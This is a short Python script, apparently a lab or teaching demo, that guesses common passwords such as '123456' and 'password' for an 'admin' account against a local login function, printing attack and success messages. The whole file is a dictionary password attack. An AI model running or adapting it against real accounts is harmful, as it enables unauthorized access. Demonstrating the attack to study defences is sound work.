from login_system import login
import time

username = "admin"
password_list = ["123456", "admin", "password", "password123"]

for password in password_list:
    print(f"[ATTACK] Trying password: {password}")
    success = login(username, password)
    if success:
        print(f"[SUCCESS] Password found: {password}")
        break
    time.sleep(1)  # simulate realistic attack speed